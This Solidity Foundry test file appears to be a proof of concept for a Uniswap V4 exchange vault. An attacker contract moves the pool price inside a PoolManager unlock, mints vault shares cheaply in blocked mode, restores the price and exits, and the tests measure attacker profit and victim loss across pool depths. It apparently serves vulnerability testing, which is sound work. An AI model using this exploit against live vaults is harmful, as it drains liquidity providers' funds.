// SPDX-License-Identifier: BSL-1.1
pragma solidity ^0.8.0;

import {console2} from "forge-std/console2.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault_Acceptance as Acceptance} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault_Acceptance.sol";
import {TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault as HBase} from "contracts/vaults/standard/exchange/protocols/uniswap/v4/fullSpread/hookless/test/bases/TestBase_UniswapV4FullSpreadHooklessStandardExchangeVault.sol";
import {ERC20PermitMintableStub} from "@crane/contracts/tokens/ERC20/ERC20PermitMintableStub.sol";
import {IERC20} from "@crane/contracts/interfaces/IERC20.sol";
import {IPoolManager} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IPoolManager.sol";
import {IUnlockCallback} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/callback/IUnlockCallback.sol";
import {IHooks} from "@crane/contracts/protocols/dexes/uniswap/v4/interfaces/IHooks.sol";
import {PoolKey} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolKey.sol";
import {PoolId, PoolIdLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolId.sol";
import {Currency} from "@crane/contracts/protocols/dexes/uniswap/v4/types/Currency.sol";
import {BalanceDelta, BalanceDeltaLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/types/BalanceDelta.sol";
import {SwapParams} from "@crane/contracts/protocols/dexes/uniswap/v4/types/PoolOperation.sol";
import {StateLibrary} from "@crane/contracts/protocols/dexes/uniswap/v4/libraries/StateLibrary.sol";
import {Vm} from "forge-std/Vm.sol";
import {FullMath} from "@crane/contracts/protocols/dexes/uniswap/libraries/FullMath.sol";
import {IStandardExchangeProxy} from "contracts/interfaces/proxies/IStandardExchangeProxy.sol";
import {IStandardExchangeOut} from "@crane/contracts/interfaces/IStandardExchangeOut.sol";
import {IStandardExchangeOutMulti} from "contracts/interfaces/IStandardExchangeOutMulti.sol";

interface IFSReserve {
    function deployedReserve() external view returns (uint256, uint256);
    function canOpenPoolManagerUnlock() external view returns (bool);
}

/// @notice Unprivileged attacker: opens its own PM.unlock, moves price, enters the vault in blocked
/// mode, moves price back, settles. Uses only its own capital (accounted as cost).
contract FSAttacker is IUnlockCallback {
    using BalanceDeltaLibrary for BalanceDelta;
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    IPoolManager immutable pm;
    IStandardExchangeProxy immutable vault;
    IERC20 immutable t0;
    IERC20 immutable t1;
    PoolKey key;

    uint256 public mintedShares;
    uint256 public paidIn;

    constructor(IPoolManager pm_, IStandardExchangeProxy vault_, PoolKey memory key_, IERC20 t0_, IERC20 t1_) {
        pm = pm_; vault = vault_; key = key_; t0 = t0_; t1 = t1_;
        t0_.approve(address(vault_), type(uint256).max);
        t1_.approve(address(vault_), type(uint256).max);
    }

    /// mode 0 = single-sided exchangeIn(token0 -> vault); mode 1 = exact-out mint exchangeOut(token0 -> vault)
    function attack(uint256 kNum, uint256 kDen, uint256 amountOrShares, uint8 mode) external {
        pm.unlock(abi.encode(kNum, kDen, amountOrShares, mode));
    }

    function unlockCallback(bytes calldata data) external returns (bytes memory) {
        require(msg.sender == address(pm), "pm only");
        (uint256 kNum, uint256 kDen, uint256 amt, uint8 mode) = abi.decode(data, (uint256, uint256, uint256, uint8));
        (uint160 sp0,,,) = pm.getSlot0(key.toId());
        require(!IFSReserve(address(vault)).canOpenPoolManagerUnlock(), "vault not blocked");
        // 1) push price up (token1 in, token0 out) -> token0 scarce in the vault book
        if (kNum != kDen) {
            uint160 target = uint160(uint256(sp0) * kNum / kDen);
            _swap(false, target);
        }
        // 2) blocked-mode entry
        uint256 b0 = t0.balanceOf(address(this));
        if (mode == 0) {mintedShares = vault.exchangeIn(t0, amt, IERC20(address(vault)), 0, address(this), false, block.timestamp);
        } else {
            IStandardExchangeOut(address(vault)).exchangeOut(t0, type(uint128).max, IERC20(address(vault)), amt, address(this), false, block.timestamp);
            mintedShares = amt;
        }
        paidIn = b0 - t0.balanceOf(address(this));
        // 3) push price back to the original sqrtP
        if (kNum != kDen) _swap(true, sp0);
        (uint160 sp1,,,) = pm.getSlot0(key.toId());
        require(sp1 == sp0, "price not restored");
        return "";
    }

    function _swap(bool zeroForOne, uint160 limit) internal {
        BalanceDelta d = pm.swap(key, SwapParams(zeroForOne, -int256(1e30), limit), "");
        _settle(key.currency0, d.amount0());
        _settle(key.currency1, d.amount1());
    }

    function _settle(Currency c, int128 delta) internal {
        if (delta < 0) {
            pm.sync(c);
            IERC20(Currency.unwrap(c)).transfer(address(pm), uint128(-delta));
            pm.settle();
        } else if (delta > 0) {
            pm.take(c, address(this), uint128(delta));
        }
    }

    /// idle proportional dual exit of all shares (PM locked => vault idle)
    function exitAll(uint256 a0, uint256 a1) external returns (uint256 burned) {
        address[] memory toks = new address[](2); toks[0] = address(t0); toks[1] = address(t1);
        uint256[] memory amts = new uint256[](2); amts[0] = a0; amts[1] = a1;
        burned = IStandardExchangeOutMulti(address(vault)).exchangeOutOneToMany(
            IERC20(address(vault)), vault.balanceOf(address(this)), toks, amts, address(this), false, block.timestamp);
    }
}

contract FSBlockedEntrySpotMintTest is Acceptance {
    using StateLibrary for IPoolManager;
    using PoolIdLibrary for PoolKey;

    FSAttacker attacker;
    uint256 constant CAP = 10_000_000e18;

    /// external (non-vault) full-range LP liquidity in the pool at setup
    function _extLiquidity() internal pure virtual returns (uint128) { return 1_000e18; }

    function setUp() public virtual override {
        HBase.setUp();
        IERC20 a = IERC20(address(new ERC20PermitMintableStub("Pair A", "A", 18, address(this), 1e32)));
        IERC20 b = IERC20(address(new ERC20PermitMintableStub("Pair B", "B", 18, address(this), 1e32)));
        bool ordered = address(a) < address(b);
        token0 = ordered ? a : b; token1 = ordered ? b : a;
        unit0 = 1e18; unit1 = 1e18;
        poolKey = PoolKey(Currency.wrap(address(token0)), Currency.wrap(address(token1)), 3_000, 60, IHooks(address(0)));
        poolManager.initialize(poolKey, uint160(1 << 96));
        _seedPool(_extLiquidity());
        vault = IStandardExchangeProxy(uniswapV4StandardExchangeDFPkg.deployVault(poolKey));
        token0.approve(address(vault), type(uint256).max);
        token1.approve(address(vault), type(uint256).max);
        // honest LP (this test contract) deposits 1000/1000 on the normal idle path
        vm.recordLogs();
        _bootstrap();
        _captureVaultPosition();
        attacker = new FSAttacker(poolManager, vault, poolKey, token0, token1);
        token0.transfer(address(attacker), CAP);
        token1.transfer(address(attacker), CAP);
    }

    // vault NAV at the restored price P=1 (both 18 decimals): free + deployed (earned fees excluded => conservative)
    function _vaultValue() internal view returns (uint256) {
        (uint256 d0, uint256 d1) = IFSReserve(address(vault)).deployedReserve();
        return token0.balanceOf(address(vault)) + token1.balanceOf(address(vault)) + d0 + d1;
    }

    function _attackerValue() internal view returns (uint256) {
        return token0.balanceOf(address(attacker)) + token1.balanceOf(address(attacker));
    }

    bytes32 vSalt; int24 vLower; int24 vUpper; bool vFound;

    function _captureVaultPosition() internal {
        Vm.Log[] memory logs = vm.getRecordedLogs();
        bytes32 sig = keccak256("ModifyLiquidity(bytes32,address,int24,int24,int256,bytes32)");
        for (uint256 i; i < logs.length; ++i) {
            if (logs[i].emitter == address(poolManager) && logs[i].topics[0] == sig
                && address(uint160(uint256(logs[i].topics[2]))) == address(vault)) {
                (vLower, vUpper,, vSalt) = abi.decode(logs[i].data, (int24, int24, int256, bytes32));
                vFound = true;
            }
        }
        require(vFound, "vault position not found");
    }

    function _earned() internal view returns (uint256 f0, uint256 f1) {
        (uint128 liq, uint256 l0, uint256 l1) = poolManager.getPositionInfo(poolKey.toId(), address(vault), vLower, vUpper, vSalt);
        (uint256 g0, uint256 g1) = poolManager.getFeeGrowthInside(poolKey.toId(), vLower, vUpper);
        unchecked {
            f0 = FullMath.mulDiv(g0 - l0, liq, uint256(1) << 128);
            f1 = FullMath.mulDiv(g1 - l1, liq, uint256(1) << 128);
        }
    }

    function _backing() internal view returns (uint256 b0, uint256 b1) {
        (uint256 d0, uint256 d1) = IFSReserve(address(vault)).deployedReserve();
        (uint256 e0, uint256 e1) = _earned();
        b0 = token0.balanceOf(address(vault)) + d0 + e0;
        b1 = token1.balanceOf(address(vault)) + d1 + e1;
    }

    function _exit() internal {
        uint256 s = vault.balanceOf(address(attacker));
        uint256 S = vault.totalSupply();
        (uint256 b0, uint256 b1) = _backing();
        for (uint256 t = s; t + 50 > s; --t) {
            uint256 a0 = b0 * t / S;
            uint256 a1 = b1 * t / S;
            if (FullMath.mulDivRoundingUp(a0, S, b0) != FullMath.mulDivRoundingUp(a1, S, b1)) continue;
            attacker.exitAll(a0, a1);
            return;
        }
        revert("exit sizing failed");
    }

    // NAV at P=1 including uncollected fees
    function _vaultValueFull() internal view returns (uint256) {
        (uint256 b0, uint256 b1) = _backing();
        return b0 + b1;
    }

    uint256 rS0; uint256 rVictimShares; uint256 rV0; uint256 rVictimV0; uint256 rAtk0;

    function _logPre(string memory label) internal {
        rS0 = vault.totalSupply();
        rVictimShares = vault.balanceOf(address(this));
        rV0 = _vaultValueFull();
        rVictimV0 = rV0 * rVictimShares / rS0;
        rAtk0 = _attackerValue();
        (uint256 d0, uint256 d1) = IFSReserve(address(vault)).deployedReserve();
        console2.log("==== ", label);
        console2.log("vault free0/free1", token0.balanceOf(address(vault)), token1.balanceOf(address(vault)));
        console2.log("vault deployed0/deployed1", d0, d1);
        console2.log("pool active liquidity", uint256(poolManager.getLiquidity(poolKey.toId())));
        console2.log("vault NAV (P=1) before", rV0);
        console2.log("victim value before", rVictimV0);
    }

    function _run(uint256 kNum, uint256 kDen, uint256 amt, uint8 mode, string memory label) internal returns (int256 profit, int256 victimDelta) {
        _logPre(label);
        attacker.attack(kNum, kDen, amt, mode);
        console2.log("attacker shares minted", attacker.mintedShares());
        console2.log("attacker token0 paid into vault", attacker.paidIn());
        console2.log("fair-share equivalent (paid/V0*S0)", attacker.paidIn() * rS0 / rV0);
        _exit();
        uint256 V1 = _vaultValueFull();
        uint256 victimV1 = V1 * rVictimShares / vault.totalSupply();
        profit = int256(_attackerValue()) - int256(rAtk0);
        victimDelta = int256(victimV1) - int256(rVictimV0);
        console2.log("attacker leftover shares", vault.balanceOf(address(attacker)));
        console2.log("vault NAV after", V1);
        console2.log("victim value after", victimV1);
        console2.log("ATTACKER NET PROFIT (P=1, all fees paid)");
        console2.logInt(profit);
        console2.log("VICTIM VALUE DELTA");
        console2.logInt(victimDelta);
        console2.log("profit bps of pre-attack TVL");
        console2.logInt(profit * 10_000 / int256(rV0));
    }

    /// single-sided blocked exchangeIn after k=4 price push (sqrtP x2)
    function test_blockedSingleSidedDeposit_k4() public virtual {
        (int256 p, int256 v) = _run(2, 1, 800e18, 0, "single-sided exchangeIn, k=4");
        assertGt(p, 0, "attacker profit");
        assertLt(v, 0, "victim loss");
    }

    /// blocked-only exact-out mint after k=4
    function test_blockedExactOutMint_k4() public virtual {
        uint256 s = vault.totalSupply() * 52 / 100;
        (int256 p, int256 v) = _run(2, 1, s, 1, "exact-out mint exchangeOut, k=4");
        assertGt(p, 0, "attacker profit");
        assertLt(v, 0, "victim loss");
    }

    /// break-even sweep: add honest external full-range liquidity so the vault is a smaller share of the pool
    function test_sweepVaultShareOfPool() public {
        uint128[4] memory extra = [uint128(6_500e18), uint128(19_000e18), uint128(40_000e18), uint128(80_000e18)];
        for (uint256 i; i < extra.length; ++i) {
            uint256 snap = vm.snapshotState();
            _seedPool(extra[i]);
            _run(2, 1, 800e18, 0, "SWEEP single-sided k=4 (see pool active liquidity)");
            vm.revertToState(snap);
        }
        // smaller price move is cheaper in deep pools
        uint256 snap2 = vm.snapshotState();
        _seedPool(40_000e18);
        _run(141, 100, 400e18, 0, "SWEEP vault~2% of pool, k=2 (sqrtP x1.41), a=400");
        vm.revertToState(snap2);
    }

    /// control: same blocked deposit with no price move -> no profit
    function test_control_noManipulation() public {
        (int256 p,) = _run(1, 1, 800e18, 0, "control k=1");
        assertLe(p, 0, "no profit without manipulation");
    }
}

/// Vault is ~0.1% of pool liquidity (the project's default acceptance fixture depth): expect loss.
contract FSBlockedEntrySpotMintDeepPoolTest is FSBlockedEntrySpotMintTest {
    function _extLiquidity() internal pure override returns (uint128) { return 1_000_000e18; }
    function test_blockedSingleSidedDeposit_k4() public override {
        _run(2, 1, 800e18, 0, "DEEP POOL single-sided exchangeIn, k=4");
    }
    function test_blockedExactOutMint_k4() public override {
        _run(2, 1, vault.totalSupply() * 52 / 100, 1, "DEEP POOL exact-out mint, k=4");
    }
}
